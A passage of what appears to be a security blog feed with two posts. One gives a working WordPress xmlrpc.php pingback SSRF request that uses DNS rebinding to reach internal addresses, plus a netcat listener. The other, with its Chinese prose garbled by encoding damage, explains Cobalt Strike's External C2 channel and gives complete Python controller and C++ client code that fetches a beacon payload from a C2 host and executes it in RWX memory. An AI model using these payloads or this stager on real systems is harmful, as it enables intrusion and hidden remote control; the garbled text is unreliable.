    <url>/2019/11/01/wordpress%20xmlrpc.php%20have%20ssrf%20vuln(use%20dns%20rebinding%20bypass%20limit)/</url>
    <content><![CDATA[<!-- In the wordpress xmlrpc.php pingback_ping function, the domain which be passed in was parsed three times. -->
<!-- more -->

<p>The first is in <code>wp-includes/class-wp-xmlrpc-server.php:6774</code>to<code>wp-includes/http.php:551</code>. When the incoming url is a domain name, dns parsing will be performed and determine whether ip belongs to the intranet ip.<br><img src="./1572267029097.png" alt="Alt text"><br><img src="./1572265889994.png" alt="Alt text"></p>
<p>The second is <code>wp-includes/class-http.php:265</code>. The code in <code>wp_http_validate_url</code> is the same as the one in the first screenshot.</p>
<p><img src="./1572266403614.png" alt="Alt text"></p>
<p> The last is in <code>wp-includes/Requests/Transport/cURL.php:162</code><br> <img src="./1572266653537.png" alt="Alt text"></p>
<p>So if I provide a domain name which has very short ttl, let the first and second time be resolved to an external network address. Let the third time be resolved into an intranet addressã€‚</p>
<p>The details of the payload are as follows</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;wordpress&#x2F;xmlrpc.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 338</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;ffffffff.2FF02E9A.rbndr.us:443&#x2F;xmlrpc.php?hack&#x3D;ssrf&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;wordpress&#x2F;2019&#x2F;10&#x2F;27&#x2F;hello-world&#x2F;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;</span><br><span class="line">&lt;&#x2F;params&gt;</span><br><span class="line">&lt;&#x2F;methodCall&gt;</span><br></pre></td></tr></table></figure>
<p>ffffffff is the hexadecimal form of the intranet ip 127.0.0.1 and 2FF02E9A is the hexadecimal form of the external network ipã€‚</p>
<p>When dns parsing ffffffff.2FF02E9A.rbndr.us, the server will randomly return 127.0.0.1 or the external network ip<br><img src="./1572265098087.png" alt="Alt text"></p>
<p>Here I have been replaying this package for the convenience of testing. I hope that the dns parsing result of the request is just the external network address, the external network address, and the internal network address.(Need good luckï¼Œ i I tried thousands of times)<br>However, in the actual situation, it is entirely possible to build a dns server to accurately return the sequence of the external network address, the external network address, and the internal network addressï¼ˆI am too lazy =.=ï¼‰.</p>
<p>nc -lp 443<br><img src="./1572612651416.png" alt="Alt text"></p>
<p><img src="./1572612727295.png" alt="Alt text"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike External C2ä¿¡é“</title>
    <url>/2019/10/25/CobaltStrike%20External%20C2%E4%BF%A1%E9%81%93/</url>
    <content><![CDATA[<!-- CSçš„æ‰©å±•C2æ¥å£ï¼ˆCobalt Strike External Command and Controlï¼‰å¯ä»¥å…è®¸ç¬¬ä¸‰æ–¹ç¨‹åºä½œä¸ºteamserverå’ŒBeaconä¹‹é—´çš„ä¸€ä¸ªé¢å¤–é€šä¿¡å±‚ã€‚ä»¥ä¸‹ç®€ç§°External C2ã€‚ -->
<!-- more -->

<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>CSçš„æ‰©å±•C2æ¥å£ï¼ˆCobalt    Strike    External Command    and    Controlï¼‰å¯ä»¥å…è®¸ç¬¬ä¸‰æ–¹ç¨‹åºä½œä¸ºteamserverå’ŒBeaconä¹‹é—´çš„ä¸€ä¸ªé¢å¤–é€šä¿¡å±‚ã€‚ä»¥ä¸‹ç®€ç§°External C2ã€‚</p>
<h2 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h2><p>External C2ç”±ä¸€ä¸ªç¬¬ä¸‰æ–¹æ§åˆ¶å™¨å’Œç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ç»„æˆã€‚æ¶æ„ç¤ºæ„å›¾å¦‚ä¸‹ã€‚<br><img src="./20180402112536-822a7264-3625-1.png" alt="Alt text"></p>
<p>è¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªä»£ç†è½¬å‘çš„åŠŸèƒ½ã€‚</p>
<p>ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨è´Ÿè´£è¿æ¥ä¸ŠCSçš„External C2æœåŠ¡ã€è½¬å‘External C2æœåŠ¡æä¾›çš„payload stageã€è½¬å‘æ”»å‡»è€…ä¸‹è¾¾çš„ä»»åŠ¡ã€Beeaconä¼šè¯çš„ç›¸åº”ç­‰ã€‚</p>
<p>ç¬¬ä¸‰æ–¹æœåŠ¡ç«¯è´Ÿè´£æ³¨å…¥payload stageåˆ°å†…å­˜ã€è¯»å–Beacon Sessionçš„ç›¸åº”ï¼Œä¸‹è¾¾æœåŠ¡ç«¯ä¼ è¾¾çš„ä»»åŠ¡ç»™Beacon sessionã€‚</p>
<h2 id="External-C2åè®®"><a href="#External-C2åè®®" class="headerlink" title="External C2åè®®"></a>External C2åè®®</h2><h3 id="æ•°æ®å¸§"><a href="#æ•°æ®å¸§" class="headerlink" title="æ•°æ®å¸§"></a>æ•°æ®å¸§</h3><p>External C2å’ŒSMB Beaconä½¿ç”¨ç›¸åŒæ ¼å¼çš„æ•°æ®å¸§ï¼ˆå³External C2æ¥æ”¶å’Œå‘é€çš„å¸§ï¼ŒSMB Beaconæ¥å—å’Œå‘é€çš„å¸§éƒ½æ˜¯ä¸€æ ·çš„ï¼‰ã€‚æ‰€æœ‰å¸§éƒ½ä»¥4å­—èŠ‚çš„å°ç«¯å­—èŠ‚é¡ºåºæ•´æ•°å¼€å§‹ï¼Œæ­¤æ•´æ•°æ˜¯å¸§å†…æ•°æ®çš„é•¿åº¦ã€‚åé¢ç´§è·Ÿå¸§å†…æ•°æ®ã€‚</p>
<p><img src="./20180402112536-8237df76-3625-1.png" alt="Alt text"></p>
<h3 id="æœªæˆæƒ"><a href="#æœªæˆæƒ" class="headerlink" title="æœªæˆæƒ"></a>æœªæˆæƒ</h3><p>External C2ä¸ä¼šå¯¹å‘å®ƒè¿æ¥çš„ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨è¿›è¡Œé‰´æƒï¼Œè¿™å¬ä¸Šå¾ˆä¸åˆç†ï¼Œä½†äº‹å®å®ƒçš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ªlistenerã€‚</p>
<h2 id="External-C2ç»„ä»¶"><a href="#External-C2ç»„ä»¶" class="headerlink" title="External C2ç»„ä»¶"></a>External C2ç»„ä»¶</h2><h3 id="External-C2-Server"><a href="#External-C2-Server" class="headerlink" title="External C2 Server"></a>External C2 Server</h3><p>ä½¿ç”¨ASè„šæœ¬è¿›è¡Œå¯åŠ¨ï¼Œå¯åŠ¨å‘½ä»¤æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">externalc2_start(&quot;0.0.0.0&quot;, 2222);</span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨"><a href="#ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨" class="headerlink" title="ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨"></a>ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨</h3><p>å½“éœ€è¦æ–°ä¼šè¯æ—¶ï¼Œç¬¬ä¸‰æ–¹æ§åˆ¶å™¨è¿æ¥åˆ°External C2ã€‚ ä¸External C2çš„æ¯ä¸ªè¿æ¥è§†ä½œä¸€ä¸ªä¼šè¯æœåŠ¡ã€‚</p>
<p>ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨è¿æ¥ä¸ŠExternal C2çš„ç¬¬ä¸€ä¸ªä»»åŠ¡æ˜¯å‘é€éœ€è¦çš„é…ç½®ä¿¡æ¯ã€‚å®ƒåŒ…æ‹¬æ¶æ„ä¿¡æ¯archï¼Œå‘½åç®¡é“pipenameï¼Œå›è¿é—´éš”æ—¶é—´blockã€‚External C2ä¸ä¼šackè¿™äº›æ¶ˆæ¯ï¼Œå½“é…ç½®å®Œæˆåå‘é€goæŒ‡ä»¤ï¼Œä»¥å‘Šè¯‰External C2å‘é€payload stage</p>
<p>ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨è¯»å–åˆ°payload stageå¹¶è½¬å‘ç»™ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ï¼Œç¬¬ä¸‰æ–¹æ§åˆ¶å™¨å¿…é¡»ç­‰å¾…ä»ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯æ¥æ”¶å¸§ã€‚ å½“æ­¤å¸§åˆ°æ¥æ—¶ï¼Œç¬¬ä¸‰æ–¹æ§åˆ¶å™¨å¿…é¡»å°†å¸§å†™å…¥åˆ°å®ƒå¯¹External C2 Serverçš„è¿æ¥ï¼ˆsocketï¼‰ã€‚</p>
<p>ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨ç°åœ¨å¿…é¡»ä»External C2 Serverè¯»å–ä¸€ä¸ªå¸§ã€‚ External C2 Serverå°†ç­‰å¾…é…ç½®çš„blockæ—¶é—´å†å‘é€ä»»åŠ¡ã€‚ å¦‚æœæ²¡æœ‰ä»»ä½•å¯ç”¨ä»»åŠ¡ï¼ŒExternal C2 Serverå°†ç”Ÿæˆä¸€ä¸ªç©ºä»»åŠ¡çš„å¸§ã€‚ ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨å¿…é¡»å°†å…¶è¯»å–çš„å¸§å‘é€ç»™ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ã€‚</p>
<p>ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨ä¼šä¸€ç›´é‡å¤<strong>ç­‰å¾…-&gt;ä»ä¸€æ–¹è¯»å–-&gt;è½¬å‘åˆ°å¦ä¸€æ–¹-&gt;ç­‰å¾…</strong>çš„è¿‡ç¨‹ã€‚</p>
<h3 id="ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯"><a href="#ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯" class="headerlink" title="ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯"></a>ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯</h3><p>ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯å°†æ¥å—ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨ç¬¬ä¸€æ­¥å‘æ¥çš„payload stageã€‚è¿™ä¸ªpayload stageæ˜¯ä¸€ä¸ªå› å¤´éƒ¨è¢«patchå¯ä»¥è‡ªå¯åŠ¨çš„DLLã€‚æ­£å¸¸çš„è¿›ç¨‹æ³¨å…¥å¯ä»¥è¿è¡Œè¿™æ®µä»£ç ã€‚</p>
<p>ä¸€æ—¦payload stageè·‘èµ·æ¥äº†ï¼Œç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯å¯ä»¥è¿æ¥ä¾¿å¯ä»¥è¿æ¥åˆ°å‘½åç®¡é“æœåŠ¡å™¨ã€‚ç¬¬ä¸‰æ–¹ä»£ç†å°†åƒæ–‡ä»¶ä¸€æ ·ä»¥è¯»å†™æ–¹å¼æ‰“å¼€å‘½åç®¡é“ã€‚æ‰“å¼€å‘½åç®¡é“çš„è·¯å¾„æ˜¯<code>\\.\pipe\[pipe name here]</code>ã€‚å¦‚æœç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯çš„è¯­è¨€æœ‰æ“ä½œå‘½åç®¡é“çš„APIä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p>ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ç°åœ¨å¿…é¡»ä»Beaconå‘½åç®¡é“è¿æ¥ä¸­è¯»å–ä¸€ä¸ªå¸§ã€‚ è¯»å–æ­¤å¸§åï¼Œç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯å¿…é¡»å°†æ­¤å¸§ä¸­ç»§åˆ°ç¬¬ä¸‰æ–¹æ§åˆ¶å™¨è¿›è¡Œå¤„ç†ã€‚</p>
<p>ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ç°åœ¨å¿…é¡»ç­‰å¾…æ¥è‡ªç¬¬ä¸‰æ–¹æ§åˆ¶å™¨çš„å¸§ã€‚ ä¸€æ—¦æ­¤å¸§å¯ç”¨ï¼Œç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯å¿…é¡»å°†æ­¤å¸§å†™å…¥å‘½åç®¡é“è¿æ¥ã€‚</p>
<p>ç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ä¹Ÿä¼šä¸€ç›´é‡å¤<strong>ç­‰å¾…-&gt;ä»ä¸€æ–¹è¯»å–-&gt;è½¬å‘åˆ°å¦ä¸€æ–¹-&gt;ç­‰å¾…</strong>çš„è¿‡ç¨‹ã€‚</p>
<h2 id="Demoä»£ç "><a href="#Demoä»£ç " class="headerlink" title="Demoä»£ç "></a>Demoä»£ç </h2><p>æ§åˆ¶ç«¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExternalC2Controller</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, port)</span>:</span></span><br><span class="line">        self.port = port</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeFrame</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, len(data)) + data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendToTS</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        self._socketTS.sendall(self.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvFromTS</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span></span><br><span class="line">        _len =  self._socketTS.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">"&lt;I"</span>,_len)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> len(data) &lt; l:</span><br><span class="line">            data += self._socketTS.recv(l - len(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendToBeacon</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        self._socketClient.sendall(self.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvFromBeacon</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span></span><br><span class="line">        _len =  self._socketClient.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">"&lt;I"</span>,_len)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> len(data) &lt; l:</span><br><span class="line">            data += self._socketClient.recv(l - len(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># First thing, wait for a connection from our custom beacon</span></span><br><span class="line">        self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        self._socketBeacon.bind((<span class="string">"0.0.0.0"</span>, <span class="number">8081</span>))</span><br><span class="line">        self._socketBeacon.listen(<span class="number">1</span>)</span><br><span class="line">        self._socketClient = self._socketBeacon.accept()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Received C2 connection"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now we have a beacon connection, we kick off comms with CS External C2</span></span><br><span class="line">        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        self._socketTS.connect((<span class="string">"127.0.0.1"</span>, self.port))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send out config options</span></span><br><span class="line">        self.sendToTS(<span class="string">"arch=x86"</span>)</span><br><span class="line">        self.sendToTS(<span class="string">"pipename=xpntest"</span>)</span><br><span class="line">        self.sendToTS(<span class="string">"block=500"</span>)</span><br><span class="line">        self.sendToTS(<span class="string">"go"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Receive the beacon payload from CS to forward to our custom beacon</span></span><br><span class="line">        data = self.recvFromTS()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Sending %d bytes to beacon"</span> % len(data)</span><br><span class="line">            self.sendToBeacon(data)</span><br><span class="line"></span><br><span class="line">            data = self.recvFromBeacon()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Received %d bytes from beacon"</span> % len(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Sending %d bytes to TS"</span> % len(data)</span><br><span class="line">            self.sendToTS(data)</span><br><span class="line"></span><br><span class="line">            data = self.recvFromTS()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Received %d bytes from TS"</span> % len(data)</span><br><span class="line"></span><br><span class="line">controller = ExternalC2Controller(<span class="number">2222</span>)</span><br><span class="line">controller.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pch.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ShellAPI.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Shlobj.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"user32.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Advapi32.lib"</span>)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Shell32.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawnBeacon</span><span class="params">(<span class="keyword">char</span> *payload, DWORD len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	HANDLE threadHandle;</span><br><span class="line">	DWORD threadId = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> *alloc = (<span class="keyword">char</span> *)VirtualAlloc(<span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(alloc, payload, len);</span><br><span class="line"></span><br><span class="line">	threadHandle = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)alloc, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sends data to our C2 controller received from our injected beacon</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendData</span><span class="params">(SOCKET sd, <span class="keyword">const</span> <span class="keyword">char</span> *data, DWORD len)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*(DWORD *)buffer = len;</span><br><span class="line">	<span class="built_in">memcpy</span>(buffer + <span class="number">4</span>, data, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; len + <span class="number">4</span>) &#123;</span><br><span class="line">		bytesWritten = send(sd, buffer + totalLen, len + <span class="number">4</span> - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesWritten;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Receives data from our C2 controller to be relayed to the injected beacon</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">recvData</span><span class="params">(SOCKET sd, DWORD *len)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *buffer;</span><br><span class="line">	DWORD bytesReceived = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	recv(sd, (<span class="keyword">char</span> *)len, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">	buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(*len);</span><br><span class="line">	<span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">		bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesReceived;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creates a new C2 controller connection for relaying commands</span></span><br><span class="line"><span class="function">SOCKET <span class="title">createC2Socket</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *addr, WORD port)</span> </span>&#123;</span><br><span class="line">	WSADATA wsd;</span><br><span class="line">	SOCKET sd;</span><br><span class="line">	SOCKADDR_IN <span class="built_in">sin</span>;</span><br><span class="line">	WSAStartup(<span class="number">0x0202</span>, &amp;wsd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line">	<span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">	<span class="built_in">sin</span>.sin_port = htons(port);</span><br><span class="line">	<span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(addr);</span><br><span class="line"></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line">	connect(sd, (SOCKADDR*)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connects to the name pipe spawned by the injected beacon</span></span><br><span class="line"><span class="function">HANDLE <span class="title">connectBeaconPipe</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pipeName)</span> </span>&#123;</span><br><span class="line">	HANDLE beaconPipe;</span><br><span class="line"></span><br><span class="line">	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> beaconPipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Receives data from our injected beacon via a named pipe</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">recvFromBeacon</span><span class="params">(HANDLE pipe, DWORD *len)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *buffer;</span><br><span class="line">	DWORD bytesRead = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ReadFile(pipe, len, <span class="number">4</span>, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">	buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(*len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">		ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">		totalLen += bytesRead;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write data to our injected beacon via a named pipe</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendToBeacon</span><span class="params">(HANDLE pipe, <span class="keyword">const</span> <span class="keyword">char</span> *data, DWORD len)</span> </span>&#123;</span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>;</span><br><span class="line">	WriteFile(pipe, &amp;len, <span class="number">4</span>, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">	WriteFile(pipe, data, len, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD payloadLen = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> *payloadData = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE beaconPipe = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Create a connection back to our C2 controller</span></span><br><span class="line">	SOCKET c2socket = createC2Socket(<span class="string">"172.16.247.10"</span>, <span class="number">8081</span>);</span><br><span class="line">	payloadData = recvData(c2socket, &amp;payloadLen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Start the CS beacon</span></span><br><span class="line">	spawnBeacon(payloadData, payloadLen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop until the pipe is up and ready to use</span></span><br><span class="line">	<span class="keyword">while</span> (beaconPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="comment">// Create our IPC pipe for talking to the C2 beacon</span></span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		beaconPipe = connectBeaconPipe(<span class="string">"\\\\.\\pipe\\xpntest"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="comment">// Start the pipe dance</span></span><br><span class="line">		payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		sendData(c2socket, payloadData, payloadLen);</span><br><span class="line">		<span class="built_in">free</span>(payloadData);</span><br><span class="line"></span><br><span class="line">		payloadData = recvData(c2socket, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		sendToBeacon(beaconPipe, payloadData, payloadLen);</span><br><span class="line">		<span class="built_in">free</span>(payloadData);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="./1571643137567.png" alt="Alt text"><br><img src="./1571643153157.png" alt="Alt text"><br><img src="./1571643183702.png" alt="Alt text"></p>
